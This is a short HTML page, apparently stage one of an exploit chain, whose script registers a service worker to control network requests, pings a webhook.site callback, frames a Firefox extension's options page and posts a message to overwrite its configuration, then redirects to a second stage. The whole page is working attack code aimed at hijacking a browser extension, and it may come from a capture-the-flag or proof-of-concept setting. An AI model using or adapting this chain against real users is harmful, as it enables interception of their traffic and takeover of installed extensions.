<!DOCTYPE html>
<html>
<head><title>Stage 1</title></head>
<body>
  <script>
    async function run() {
      // 1. Register SW
      await navigator.serviceWorker.register('/sw.js', { scope: '/' });
      
      // 2. Wait until SW fully controls network requests
      if (!navigator.serviceWorker.controller) {
        await new Promise(resolve => {
          navigator.serviceWorker.addEventListener('controllerchange', resolve, { once: true });
        });
      }

      // Ping Webhook so you know Stage 1 finished
      fetch('https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?stage=1_sw_ready');

      // 3. Open options iframe and hijack config
      const iframe = document.createElement('iframe');
      iframe.src = 'moz-extension://09a6c422-a354-447d-b4ea-185cb10be869/options.html';
      document.body.appendChild(iframe);

      iframe.onload = () => {
        iframe.contentWindow.postMessage({
          activateOn: window.location.origin,
          href: 'https://doc.rust-lang.org/?bypass=1'
        }, '*');

        setTimeout(() => {
          window.location.href = '/stage2.html?ref=https://doc.rust-lang.org/';
        }, 1000);
      };
    }
    run();
  </script>
</body>
</html>
